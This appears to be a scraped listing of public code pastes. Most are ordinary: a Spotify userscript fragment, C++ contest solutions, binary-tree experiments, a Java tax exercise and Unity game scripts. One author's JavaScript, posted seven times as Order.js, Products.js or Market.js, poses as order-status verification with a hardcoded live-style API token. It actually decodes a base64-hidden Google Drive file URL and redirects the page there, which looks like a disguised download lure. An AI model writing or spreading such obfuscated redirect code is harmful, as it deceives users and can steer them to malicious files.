                            newMenuItemButton.setAttribute('tabindex', '0'); // Make it focusable

                            // --- Styling: Copy classes from the reference button ---
                            newMenuItemButton.className = referenceButton.className;
                            newMenuItemButton.classList.add('custom-background-link-item'); // Add our custom class

                            // --- Structure: Add text inside a span like Spotify likely does ---
                            const textSpan = document.createElement('span');
                            textSpan.textContent = ""Otwórz link w tle"";
                             // Optionally copy span classes from referenceButton's span if needed
                             const originalSpan = referenceButton.querySelector('span');
                             if(originalSpan) {
                                // Be careful not to copy classes that might conflict
                                // textSpan.className = originalSpan.className;
                             }
                            newMenuItemButton.appendChild(textSpan);

                            // --- Add click listener ---
                            // Pass the URL captured *before* this specific listener was added
                            newMenuItemButton.addEventListener('click', (clickEvent) => {
                                // Call the function defined outside the loop
                                handleMenuItemClick(currentUrl, clickEvent);
                            });

                            // --- Append to the end of the menu ---
                            // Append to the menu element itself (div or ul with role=""menu"")
                            menu.appendChild(newMenuItemButton);
                            // console.log('[Spotify Background Link] Appended ""Otwórz link w tle"" item to the end.');

                            // Mark this specific menu instance as modified
                            menu.dataset.customLinkAdded = 'true';

                        } else {
                             // console.log('[Spotify Background Link] Reference button (""Dodaj do playlisty"") not found in this menu. Cannot add item.');
                        }
                    }
                 }
            }
        }
    });

    // Start observing the body for added nodes (menus)
    observer.observe(document.body, {
        childList: true, // Watch for direct children additions
        subtree: true // Watch for additions in descendants too (important for portals)
    });

    console.log('[Spotify Background Link] Script v2.2 loaded and observing.');

})();"
vt0QRahL,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 05:46:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30854/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N9sw0xY2,Products.js,WantingTrae,JavaScript,Saturday 12th of April 2025 05:31:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27021/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
g1PBE38z,Untitled,gandalfbialy,Python,Saturday 12th of April 2025 05:30:40 AM CDT,"import numpy as np
import matplotlib.pyplot as plt

x = np.linspace(0, 50, 500)

def fuzzy_comfort(x):
  return np.maximum(np.minimum(np.minimum((x - 10)  / (20 - 10), 1), (40 - x) / (40 - 30)), 0)

mu_comfort = fuzzy_comfort(x)
print(fuzzy_comfort(50))

# Punkty charakterystyczne
points_x = [10, 20, 30, 40]
points_y = fuzzy_comfort(np.array(points_x))
labels = ['a (10°C)', 'b (20°C)', 'c (30°C)', 'd (40°C)']

# Rysowanie wykresu
plt.figure(figsize=(10, 5))
plt.plot(x, mu_comfort, label='Temperatura komfortowa', color='green')
plt.scatter(points_x, points_y, color='black', zorder=5)

# Etykiety
for i, label in enumerate(labels):
    plt.annotate(label, (points_x[i], points_y[i] + 0.05), ha='center')

plt.title('Funkcja przynależności: Temperatura komfortowa (trapez: 10, 20, 30, 40)')
plt.xlabel('Temperatura [°C]')
plt.ylabel('Przynależność')
plt.grid(True)
plt.legend()
plt.ylim(0, 1.1)
plt.show()"
6wgRie0C,Untitled,gandalfbialy,Python,Saturday 12th of April 2025 05:26:55 AM CDT,"# Punkty charakterystyczne
points_x = [10, 20, 30, 40]
points_y = fuzzy_comfort(np.array(points_x))
labels = ['a (10°C)', 'b (20°C)', 'c (30°C)', 'd (40°C)']

# Rysowanie wykresu
plt.figure(figsize=(10, 5))
plt.plot(x, mu_comfort, label='Temperatura komfortowa', color='green')
plt.scatter(points_x, points_y, color='black', zorder=5)

# Etykiety
for i, label in enumerate(labels):
    plt.annotate(label, (points_x[i], points_y[i] + 0.05), ha='center')

plt.title('Funkcja przynależności: Temperatura komfortowa (trapez: 10, 20, 30, 40)')
plt.xlabel('Temperatura [°C]')
plt.ylabel('Przynależność')
plt.grid(True)
plt.legend()
plt.ylim(0, 1.1)
plt.show()"
bSVMMLbt,好串的数目 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 05:19:07 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const LL MOD = 1000000007;
const int maxn = 100000 + 100;
int n, nxt, idx;
LL ans;
char str[maxn];
LL len[maxn];

int findNxt(int idx) {
    for (int i = idx + 1; i < n; ++i) {
        if (str[i] != str[i - 1] && str[i] != str[i - 1] + 1) {
            return i;
        }
    }
    return n;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    cin >> str;
    n = strlen(str);
    for (int i = 0; i < n; i = nxt) {
        nxt = findNxt(i);
        len[idx] = nxt - i;
        ans += len[idx] * (len[idx] + 1) / 2;
        ++idx;
    }
    for (int i = 1; i < idx; ++i) {
        ans += len[i] * len[i - 1];
    }
    cout << ans << endl;

    return 0;
}
"
XPC9BH3s,Order.js,WantingTrae,JavaScript,Saturday 12th of April 2025 05:15:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70687/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SuAEHG4S,黑客 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 05:02:45 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const LL MOD = 1000000007;
const int maxn = 500000 + 100;
int n, nn;
LL ans;
LL num[maxn];
LL cnt[maxn], fac[maxn], facInv[maxn];

LL fastPow(LL res, LL n) {
    LL ans;
    for (ans = 1; n != 0; n >>= 1) {
        if ((n & 1) == 1) {
            ans = ans * res % MOD;
        }
        res = res * res % MOD;
    }
    return ans;
}

LL inv(LL x) {
    return fastPow(x, MOD - 2);
}

void init() {
    fac[0] = 1;
    for (int i = 1; i < maxn; ++i) {
        fac[i] = fac[i - 1] * i % MOD;
    }
    facInv[maxn - 1] = inv(fac[maxn - 1]);
    for (int i = maxn - 2; i >= 0; --i) {
        facInv[i] = facInv[i + 1] * (i + 1) % MOD;
    }
}

LL solve(int x, int y) {
    if (cnt[x] < 1 || cnt[y] < 1) {
        return 0;
    }
    LL ret = fac[nn];
    --cnt[x];
    --cnt[y];
    for (int i = 0; i < n; ++i) {
        ret = ret * facInv[cnt[num[i]]] % MOD;
    }
    ++cnt[x];
    ++cnt[y];
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    init();
    cin >> n;
    for (int i = 0; i < n; ++i) {
        cin >> num[i];
        ++cnt[num[i]];
    }
    nn = n - 2;
    sort(num, num + n);
    n = unique(num, num + n) - num;
    for (int i = 1; i <= nn / i; ++i) {
        LL tmp = 0;
        if (nn % i == 0) {
            tmp = solve(i, nn / i) % MOD;
            if (nn / i != i) {
                tmp = tmp * 2 % MOD;
            }
        }
        ans = (ans + tmp) % MOD;
    }
    cout << ans << endl;

    return 0;
}
"
X4gjgULf,Market.js,WantingTrae,JavaScript,Saturday 12th of April 2025 05:00:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14776/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LL3UJezK,tree9,Korotkodul,C++,Saturday 12th of April 2025 04:51:45 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(vector<int> a) {
        arr = a;
        if (a.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }
};

int main() {
    tree T;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7,8, 9, 10, 11};
    T.create(a);
    cout << ""TRAVERSAL ORDER:\n"";
    T.trav(T.main_root);
    cout << endl;

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
v14L713X,tree8,Korotkodul,C++,Saturday 12th of April 2025 04:47:28 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        cout << ""creating\n"";
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        cout << root.val << ""\n"";
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            root.val = this->arr[(Ri + Li) / 2 + 1];
            cout << ""change val: "" << root.val << ""\n"";
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        cout << ""\n"";
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    /*node find_first(node  v) {
        node res = v;
        while (v.l != nullptr) {
            res = &(res.l);
        }
        return res;
    }
    node find_next(node v) {
        return;
    }*/
    void trav(node root) {
        cout << ""trav\n"";
        cout << root.val << ""\n"";
        if (root.l == nullptr && root.r == nullptr) {
            cout << root.val << "" "";
            return;
        }
        if (root.l != nullptr) {
            trav(*(root.l));
        }
        cout << root.val << "" "";
        if (root.r != nullptr) {
            trav(*(root.r));
        }
    }
    void insert_after(node v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    cout << ""TRAVERSAL ORDER\n"";
    T.trav(T.main_root);
}

"
sXSFySNx,Untitled,WantingTrae,JavaScript,Saturday 12th of April 2025 04:44:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23040/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FHDGDPLX,tree6,Korotkodul,C++,Saturday 12th of April 2025 04:35:57 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
        Ri == Li - особ случ*/
        cout << ""Li Ri: "" << Li << ' ' << Ri << ""\n"";
        node root(par);
        root.val = this->arr[(Ri + Li) / 2];
        node left_root;
        node right_root;
        if (Ri == Li) {
            return root;
        }
        if (Ri == Li + 1) { //Ri - root, Li - left_root
            left_root = create_subtree(root.self, Li, Li);
            root.l = left_root.self;
            return root;
        }
        left_root = create_subtree(root.self, Li, (Ri + Li) / 2 - 1);
        right_root = create_subtree(root.self, (Ri + Li) / 2 + 1, Ri);
        root.l = left_root.self;
        root.r = right_root.self;
        return root;
    }
    void create(vector <int> a) {
        arr = a;
        if (a.size() == 0) {
            return;
        }
        int len = a.size();
        main_root = create_subtree(nullptr, 0, len - 1);
        cout << ""created\n"";
        return;
    }
    /*node find_first(node  v) {
        node res = v;
        while (v.l != nullptr) {
            res = &(res.l);
        }
        return res;
    }
    node find_next(node v) {
        return;
    }*/
    void trav(node root) {
        cout << ""trav\n"";
        cout << root.val << ""\n"";
        if (root.self == nullptr) {
            return;
        }
        if (root.l == nullptr && root.r == nullptr) {
            cout << root.val << "" "";
            return;
        }
        trav(*(root.l));
        cout << root.val << "" "";
        trav(*(root.l));
    }
    void insert_after(node v) { //а insert_defore надо?
        return;
    }
};

int main() {
    tree T;
    vector <int> a = {1, 2, 3, 4, 5};
    T.create(a);
    cout << ""TRAVERSAL ORDER\n"";
    T.trav(T.main_root);
}

"
SBWJ6qxR,[NP] MojDDV,dzocesrce,Java,Saturday 12th of April 2025 04:35:56 AM CDT,"import java.io.*;
import java.util.ArrayList;
import java.util.DoubleSummaryStatistics;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;
import java.util.Arrays;
import java.util.Comparator;


public class MojDDVTest {

    public static void main(String[] args) {

        MojDDV mojDDV = new MojDDV();

        //In IntelliJ we must use CTRL+D in order to break the INPUT STREAM.
        System.out.println(""===READING RECORDS FROM INPUT STREAM==="");
        mojDDV.readRecords(System.in);

        System.out.println(""===PRINTING TAX RETURNS RECORDS TO OUTPUT STREAM ==="");
        mojDDV.printTaxReturns(System.out);

        System.out.println(""===PRINTING SUMMARY STATISTICS FOR TAX RETURNS TO OUTPUT STREAM==="");
        mojDDV.printStatistics(System.out);

    }
}

class MojDDV {

    private List<Receipt> receipts;

    public MojDDV() {
        receipts= new ArrayList<Receipt>();
    }

    //for every line we try to make a receipt, if it throws an exception we simply mark it as null.
    //then we filter out the null objects and collect them into a list, which represents the receipts of the actual MojDDV object.
    public void readRecords(InputStream in) {
        this.receipts = new BufferedReader(new InputStreamReader(in))
                .lines()
                .map(i -> {
                    try {
                        return Receipt.createReceipt(i);
                    } catch (AmountNotAllowedException e) {
                        System.out.println(e.getMessage());
                        return null;
                    }
                })
                .filter(Objects::nonNull)
                .collect(Collectors.toList());


    }

    //First we sort the receipts and then we print every single one.
    public void printTaxReturns(OutputStream out) {

        PrintWriter printWriter = new PrintWriter(out);

        this.receipts.stream().
               // sorted().
                forEach(i -> printWriter.println(i));

        printWriter.flush();
    }

    //if we need statistics such as min,max,avg... we can use the
    // DoubleSummaryStatistcs class that generates them for our data.
    public void printStatistics(OutputStream out) {
        PrintWriter printWriter = new PrintWriter(out);
        DoubleSummaryStatistics summaryStatistics = receipts.stream()
                        .mapToDouble(i-> i.taxReturns())
                                .summaryStatistics();

        printWriter.format(""min:\t%.3f\nmax:\t%.3f\nsum:\t%.3f\ncount:\t%d\navg:\t%.3f\n"",
                summaryStatistics.getMin(),
                summaryStatistics.getMax(),
                summaryStatistics.getSum(),
                summaryStatistics.getCount(),
                summaryStatistics.getAverage());

        printWriter.flush();
    }
}

class Receipt implements Comparable<Receipt> {
    private long id;
    private List<Item> items;

    public Receipt(long id) {
        this.id = id;
        this.items = new ArrayList<>();
    }

    public Receipt(long id, List<Item> items) {
        this.id = id;
        this.items = items;
    }

    //We create objects through this method where we cut down the input line.
    //We through an exception which we try and match in the readData method.
    public static Receipt createReceipt(String line) throws AmountNotAllowedException {
    String[] parts= line.split(""\\s+"");
    long id= Long.parseLong(parts[0]);

    List<Item> items = new ArrayList<>();

        Arrays.stream(parts)
                .skip(1)
                .forEach(i -> {
                    if(Character.isDigit(i.charAt(0))){
                        items.add(new Item(Integer.parseInt(i)));
                    }
                    else{
                        items.get(items.size()-1).setTaxType(TaxType.valueOf(i));
                    }
                });
        if(totalAmount(items)>30000)
            throw new AmountNotAllowedException(totalAmount(items));

        return new Receipt(id,items);
    }

    //We get all the items into a stream and map to Int or Double their adequate amount, and then we sum them all.
    public static int totalAmount(List<Item> items){
        return items.stream().mapToInt(i -> i.getAmount()).sum();
    }
    public int totalAmount(){
        return items.stream().mapToInt(i -> i.getAmount()).sum();
    }

    public double taxReturns(){
        return items.stream().mapToDouble(i -> i.getTaxReturn()).sum();
    }

    //We compare the order of listing/sorting for 2 receipts, first through their taxReturn,
    // and then through their totalAmount attribute.
    @Override
    public int compareTo(Receipt other) {
        return Comparator.comparing(Receipt::taxReturns)
                .thenComparing(Receipt::totalAmount)
                .compare(this,other);
    }

    @Override
    public String toString() {
        return String.format(""%10d\t%10d\t%10.5f"",id,totalAmount(),taxReturns());
    }
}

class Item {
    private int amount;
    private TaxType taxType;
    private static double TAX_V=0.0;
    private static double TAX_A=0.18;
    private static double TAX_B=0.05;

    public Item(int amount) {
        this.amount = amount;
    }

    public double getTaxReturn(){
        if(taxType==TaxType.V)
            return 0.15*amount*TAX_V;
        else if(taxType==TaxType.B)
            return 0.15*amount*TAX_B;
        else
            return 0.15*amount*TAX_A;
    }

    public int getAmount() {
        return amount;
    }

    public void setAmount(int amount) {
        this.amount = amount;
    }

    public TaxType getTaxType() {
        return taxType;
    }

    public void setTaxType(TaxType taxType) {
        this.taxType = taxType;
    }
}

enum TaxType {
    A,
    B,
    V
}

class AmountNotAllowedException extends Exception{
    public AmountNotAllowedException(int totalAmount) {
        super(String.format(""Receipt with amount %d is not allowed to be scanned"",totalAmount));
    }
}"
iiB8qK3P,Untitled,gandalfbialy,C#,Saturday 12th of April 2025 04:32:46 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;
public class WinPlace : MonoBehaviour
{
    float alfa = 0;
    void FixedUpdate()
    {
        float scale = Resizer();
        transform.localScale = new Vector3(scale, 4.5f, scale);
    }
    public float Resizer()
    {
        float value = Mathf.Sin(alfa);
        alfa += (1.5f * Time.deltaTime);
        return value + 2f;
    }
    private void OnTriggerEnter(Collider other)
    {
        if (other.gameObject.tag == ""Player"")
        {
            GameManager.gameManager.WinGame();
        }
    }
}"
kt1GceBH,Products.js,WantingTrae,JavaScript,Saturday 12th of April 2025 04:29:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88017/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hCsiebfn,Untitled,gandalfbialy,C#,Saturday 12th of April 2025 04:24:25 AM CDT,"using System.Collections;
using System.Collections.Generic;
using System.Net.Sockets;
using UnityEngine;

public class Lock : MonoBehaviour
{
    bool canOpen = false;
    public Door[] doors;
    public KeyColor keyColor;
    public bool isLocked = false;
    Animator key;

    // Start is called before the first frame update
    void Start()
    {
        key = GetComponent<Animator>();
    }

    // Update is called once per frame
    void Update()
    {
        if (canOpen && !isLocked)
        {
            GameManager.gameManager.SetUseInfo(""Press E to open lock"");
        }

        if (Input.GetKeyDown(KeyCode.E) && canOpen && !isLocked)
        {
            key.SetBool(""useKey"", CheckTheKey());
        }
    }

    public void UseKey()
    {
        foreach (Door door in doors)
        {
            door.Open();
        }
    }

    public bool CheckTheKey()
    {
        if (GameManager.gameManager.redKey > 0 && keyColor == KeyColor.Red)
        {
            GameManager.gameManager.redKey--;
            GameManager.gameManager.redKeyText.text = GameManager.gameManager.redKey.ToString();

            isLocked = true;
            return true;
        }
        else if (GameManager.gameManager.greenKey > 0 && keyColor == KeyColor.Green)
        {
            GameManager.gameManager.greenKey--;
            GameManager.gameManager.greenKeyText.text = GameManager.gameManager.greenKey.ToString();

            isLocked = true;
            return true;
        }
        else if (GameManager.gameManager.goldKey > 0 && keyColor == KeyColor.Gold)
        {
            GameManager.gameManager.goldKey--;
            GameManager.gameManager.goldKeyText.text = GameManager.gameManager.goldKey.ToString();

            isLocked = true;
            return true;
        }
        else
        {
            Debug.Log(""Nie masz klucza!"");
            return false;
        }
    }

    private void OnTriggerEnter(Collider other)
    {
        if (other.CompareTag(""Player""))
        {
            canOpen = true;
            Debug.Log(""You can open the door now!"");
        }
    }

    private void OnTriggerExit(Collider other)
    {
        if (other.CompareTag(""Player""))
        {
            canOpen = false;
            GameManager.gameManager.SetUseInfo("""");

            Debug.Log(""You can not open the door :("");
        }
    }
}"
VwrZr7Zr,红黑树 参考代码,Dmaxiya,C++,Saturday 12th of April 2025 04:23:56 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 10 + 100;
int n, row, col;

int dfs(int row, int col) {
    if (row == 0) {
        return 0;
    }
    int tmp = dfs(row - 1, col >> 1);
    if (col & 1) {
        tmp ^= 1;
    }
    return tmp;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc

    cin >> n;
    while (n--) {
        cin >> row >> col;
        int ans = dfs(row - 1, col - 1);
        cout << (ans == 0 ? ""RED"" : ""BLACK "") << endl;
    }

    return 0;
}
"
z5DzM7j6,14 5 неизвестных,nq1s788,Python,Saturday 12th of April 2025 04:15:27 AM CDT,"#1 https://inf-ege.sdamgia.ru/test?id=18072637&nt=True&pub=False
for p in range(9, 25):
    for x in range(p):
        for y in range(p):
            for z in range(p):
                for w in range(p):
                    if z * p**4 + x * p**3 + y * p**2 + x * p + 4 + x * p**4 + y * p**3 + 6 * p**2 + 5 * p + 8 == w * p**4 + z * p**3 + x * p**2 + 7 * p + 3:
                        print(x * p**3 + y * p**2 + z * p + w)"
Tc2a3LMj,Order.js,WantingTrae,JavaScript,Saturday 12th of April 2025 04:14:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47037/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
L6CWDj6L,tree5,Korotkodul,C++,Saturday 12th of April 2025 04:11:12 AM CDT,"#include <iostream>
#include <sstream>
#include <exception>
#include <cmath>
#include <unordered_set>
#include <vector>
#include <unordered_map>
#include <algorithm>
using namespace std;

const int inf = 2e9;

struct node{
    node* self;
    node* parent;
    node* l;
    node* r;
    int val;
    node(node *par) : parent(par), l(nullptr), r(nullptr), self(this), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), self(this),val (inf) {}
    node(node *par, node *L, node *R) : parent(par), l(L), r(R), self(this), val(inf) {}
};

struct tree{
    vector <int> arr; //используется ТОЛЬКО для инициализациидерева
    node main_root;
    node create_subtree(node* par, int Li, int Ri) {
        /*Ri == Li + 2 - работает по алгоритмы
        Ri == Li + 1 - особ случ
